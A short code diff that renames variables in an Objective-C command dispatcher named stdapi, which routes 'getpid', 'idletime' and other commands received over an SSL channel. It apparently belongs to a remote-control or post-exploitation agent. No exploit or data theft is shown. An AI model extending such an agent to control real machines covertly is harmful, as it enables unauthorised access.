@@ -34,14 +34,14 @@ void stdapi(SSL *channel, char *cmd, char *args, char *plugin)
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
 
-    NSString *command = [NSString stringWithFormat:@"%s", cmd];
-    NSString *argv = [NSString stringWithFormat:@"%s", args];
-    NSString *plugin = [NSString stringWithFormat:@"%s", plugin];
+    NSString *fcmd = [NSString stringWithFormat:@"%s", cmd];
+    NSString *fargs = [NSString stringWithFormat:@"%s", args];
+    NSString *fplugin = [NSString stringWithFormat:@"%s", plugin];
 
-    if ([command isEqualToString:@"getpid"])
+    if ([fcmd isEqualToString:@"getpid"])
         [commands cmd_getpid];
-    else if ([command isEqualToString:@"idletime"])
+    else if ([fcmd isEqualToString:@"idletime"])
         [commands cmd_idletime];
     else
-        generic(channel, command, argv);
+        generic(channel, cmd, args, plugin);
 }
